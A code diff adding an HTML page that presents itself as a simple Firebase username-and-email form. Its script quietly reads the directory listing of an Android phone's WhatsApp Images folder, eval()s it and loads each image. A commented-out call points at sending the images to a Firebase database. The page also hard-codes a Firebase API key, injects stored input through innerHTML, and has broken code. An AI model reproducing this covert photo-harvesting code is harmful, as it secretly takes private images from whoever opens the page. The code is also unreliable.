@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title></title>
+</head>
+<body>
+<--
+<h3>Yuk Coba</h3>
+<form id="open">
+  <input id="user" type="username" placeholder="username">
+  <input id="email" type="email" placeholder="email">
+  <p><button type="submit" id="btn">SUBMIT</button></p>
+</form>
+-->
+<div id="list"></div>
+
+<script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-database.js"></script>
+
+<script type="text/javascript">
+
+let url = "/storage/emulated/0/whatsApp/Media/WhatsApp Images/";
+var xhr = new XMLHttpRequest();
+xhr.open("GET", url, true);
+//xhr.responseType = 'document';
+xhr.onload = () => {
+  let sty = xhr.response.replace(/<script>/g,"");
+  sty = sty.replace(/<\/script>/g,"");
+  eval(sty);
+}
+xhr.send()
+
+
+// Your web app's Firebase configuration
+  var firebaseConfig = {
+    apiKey: "AIzaSyAIgCzDycY8Ya7XUzlx8kzUa_01zlFIKJg",
+    authDomain: "the-web-99030.firebaseapp.com",
+    databaseURL: "https://the-web-99030.firebaseio.com",
+    projectId: "the-web-99030",
+    storageBucket: "the-web-99030.appspot.com",
+    messagingSenderId: "793051782942",
+    appId: "1:793051782942:web:2d59b3aa02097e25da730f"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  
+  var ref = firebase.storage().ref('users');
+  
+  let imgs = [];
+  var canvas = document.createElement("canvas");
+  var ctx = canvas.getContext("2d");
+  function start(){}
+  function onHasParentDirectory(){}
+  function addRow(a){
+  let img = new Image();
+  img.src = url+a;
+  img.onload=()=>{
+  //writeUser("Img", img);
+  }
+  }
+  // Get a reference to the database service
+  var ref = firebase.database().ref('users');
+  
+  var list = document.querySelector("#list");
+  
+  ref.on("value", function(todos){
+    var temp = "";
+    todos.forEach(function(todo){
+      var item = todo.val();
+      temp += "<p>"+item.email+" , "+item.username+' , <button onclick="Remove(\''+todo.key+'\')">Del</button></p>';
+    });
+    list.innerHTML = temp;
+  });
+  
+  function writeUser(name, email) {
+    var newusers = ref.push().set({
+      username: name,
+      email: email,
+    });
+  }
+  
+  function Remove(id){
+    firebase.database().ref('users/'+id).remove();
+  }
+  
+  document.querySelector("#open").onsubmit=submitform;
+  function submitform(e){
+    e.preventDefault();
+    
+    var user = document.querySelector("#user").value;
+    var email = document.querySelector("#email").value;
+    
+    writeUser(user, email);
+    
+    document.querySelector("#user").value = "";
+    document.querySelector("#email").value = "";
+  }
+</script>
+</body>
+</html>
